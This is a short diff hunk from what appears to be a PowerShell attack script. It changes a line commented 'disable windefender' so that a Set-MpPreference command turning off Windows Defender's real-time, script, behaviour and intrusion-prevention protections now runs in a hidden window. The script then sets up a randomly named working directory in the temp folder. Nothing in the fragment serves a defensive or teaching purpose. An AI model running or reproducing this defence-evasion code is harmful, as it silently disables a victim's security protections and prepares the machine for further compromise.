@@ -7,7 +7,7 @@ function random_text {
 }
 
 # disable windefender
-powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
+powershell powershell.exe -windowstyle hidden 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
 
 # goto temp & make working directory
 $wd = random_text
